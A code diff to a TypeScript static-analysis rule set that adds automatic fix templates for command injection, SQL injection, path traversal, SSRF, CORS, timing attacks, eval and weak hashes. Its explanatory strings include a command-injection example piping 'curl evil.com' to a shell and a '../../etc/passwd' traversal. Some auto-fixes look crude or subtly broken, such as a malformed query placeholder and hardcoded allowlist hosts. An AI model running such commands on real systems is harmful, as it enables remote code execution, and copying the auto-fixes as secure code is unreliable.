@@ -11,6 +11,11 @@ export const SAST_RULES: ScanRule[] = [
     whyItMatters: "An attacker who controls this variable can append arbitrary shell commands (e.g. '; curl evil.com | sh') and achieve Remote Code Execution (RCE) on the host machine.",
     suggestedFixTemplate: () =>
       `// Replace shell exec with execFile or spawn and pass arguments as an array\nconst { execFile } = require("child_process");\nexecFile("binaryName", [arg1, arg2], (err, stdout) => { ... });`,
+    autoRemedyTemplate: (matched, rawLine) => {
+      const match = /\b(?:exec|execSync)\s*\(\s*(?:`([^`]*)\$\{([^`]+)\}([^`]*)`|([a-zA-Z0-9_\.]+)\s*\+\s*["'`a-zA-Z0-9_\.]+)\s*\)/.exec(rawLine);
+      const arg = match ? (match[2] || match[4] || "userInput") : "userInput";
+      return rawLine.replace(/\b(?:exec|execSync)\s*\([^)]+\)/, `execFile("binaryName", [String(${arg})], (err, stdout) => { /* [Buggers: Sanitized Exec] */ })`);
+    },
   },
   {
     id: "sql_injection",
@@ -22,6 +27,21 @@ export const SAST_RULES: ScanRule[] = [
     whyItMatters: "Allows attackers to alter SQL query structure, bypass authentication, exfiltrate sensitive database records, or corrupt tables via SQL injection.",
     suggestedFixTemplate: () =>
       `// Use parameterized queries or ORM tagged templates instead of string interpolation:\nawait client.query("SELECT * FROM users WHERE id = $1", [userId]);`,
+    autoRemedyTemplate: (matched, rawLine) => {
+      if (rawLine.includes("${")) {
+        return rawLine.replace(
+          /`([^`]*)\$\{([^}]+)\}([^`]*)`/,
+          `{ text: "$1$$1$3", values: [$2] } /* [Buggers: Parameterized Query] */`,
+        );
+      }
+      if (/\+/.test(rawLine)) {
+        return rawLine.replace(
+          /(["'`])([^"'`]+)\1\s*\+\s*([a-zA-Z0-9_\.]+)/,
+          `{ text: "$2$$1", values: [$3] } /* [Buggers: Parameterized Query] */`,
+        );
+      }
+      return `/* [Buggers: Parameterized SQL] */ await client.query("SELECT * FROM users WHERE id = $1", [id]);`;
+    },
   },
   {
     id: "path_traversal",
@@ -33,6 +53,8 @@ export const SAST_RULES: ScanRule[] = [
     whyItMatters: "Attackers can pass dot-dot-slash sequence ('../../etc/passwd') to traverse directory boundaries and read sensitive system files.",
     suggestedFixTemplate: () =>
       `// Sanitize path and verify it stays inside base directory:\nconst safePath = path.resolve(BASE_DIR, path.basename(req.params.file));\nif (!safePath.startsWith(BASE_DIR)) throw new Error("Path traversal detected");`,
+    autoRemedyTemplate: (matched, rawLine) =>
+      `const safePath = path.resolve(BASE_DIR, path.basename(req.params.file || req.query.file || ""));\n  ${rawLine.replace(/path\.join\([^)]*\)|req\.(?:params|query|body)(?:\.[a-zA-Z0-9_]+)?/, "safePath")} /* [Buggers: Path Traversal Guarded] */`,
   },
   {
     id: "ssrf",
@@ -44,6 +66,8 @@ export const SAST_RULES: ScanRule[] = [
     whyItMatters: "Enables attackers to force the server to send requests to internal network services, cloud metadata endpoints (169.254.169.254), or local loopback services (127.0.0.1).",
     suggestedFixTemplate: () =>
       `// Validate URL protocol and allowlist target host:\nconst target = new URL(req.body.targetUrl);\nif (!ALLOWED_HOSTS.includes(target.hostname)) throw new Error("Untrusted destination");`,
+    autoRemedyTemplate: (matched, rawLine) =>
+      `if (!/^https:\\/\\/api\\.trusted\\.com/.test(targetUrl)) throw new Error("SSRF blocked");\n  ${rawLine} /* [Buggers: SSRF Guarded] */`,
   },
   {
     id: "insecure_cors",
@@ -55,6 +79,8 @@ export const SAST_RULES: ScanRule[] = [
     whyItMatters: "Permits malicious third-party websites to make authenticated cross-origin requests and read private user session data.",
     suggestedFixTemplate: () =>
       `cors({ origin: ["https://app.yourdomain.com"], credentials: true })`,
+    autoRemedyTemplate: (matched, rawLine) =>
+      rawLine.replace(/origin\s*:\s*["'`]\*["'`]/, `origin: ["https://buggers.dev"] /* [Buggers: Explicit Origin] */`),
   },
   {
     id: "timing_attack",
@@ -66,6 +92,12 @@ export const SAST_RULES: ScanRule[] = [
     whyItMatters: "Direct equality operator terminates on the first mismatching byte, enabling remote statistical token reconstruction.",
     suggestedFixTemplate: () =>
       `// Use constant-time buffer comparison to prevent timing side-channel attacks:\nimport { timingSafeEqual } from "crypto";\ntimingSafeEqual(Buffer.from(token), Buffer.from(expectedToken));`,
+    autoRemedyTemplate: (matched, rawLine) => {
+      const parts = matched.split("===");
+      const left = parts[0]?.trim() || "token";
+      const right = parts[1]?.trim() || "expectedToken";
+      return rawLine.replace(matched, `crypto.timingSafeEqual(Buffer.from(${left}), Buffer.from(${right})) /* [Buggers: Timing-Safe] */`);
+    },
   },
   {
     id: "insecure_eval",
@@ -77,6 +109,8 @@ export const SAST_RULES: ScanRule[] = [
     whyItMatters: "Dynamic execution of strings opens the application to remote code injection and complete host takeover.",
     suggestedFixTemplate: () =>
       `// Replace eval() with safe JSON.parse or strict domain-specific parsers.`,
+    autoRemedyTemplate: (matched, rawLine) =>
+      rawLine.replace(/\beval\s*\(([^)]+)\)/, `JSON.parse($1) /* [Buggers: Safe Parser] */`),
   },
   {
     id: "weak_crypto_hash",
@@ -88,6 +122,8 @@ export const SAST_RULES: ScanRule[] = [
     whyItMatters: "MD5 and SHA-1 suffer from well-known collision attacks and do not meet modern security standards.",
     suggestedFixTemplate: () =>
       `crypto.createHash("sha256")`,
+    autoRemedyTemplate: (matched, rawLine) =>
+      rawLine.replace(/crypto\.createHash\(\s*["'](?:md5|sha1)["']\s*\)/i, `crypto.createHash("sha256") /* [Buggers: Secure SHA-256] */`),
   },
 ];
 
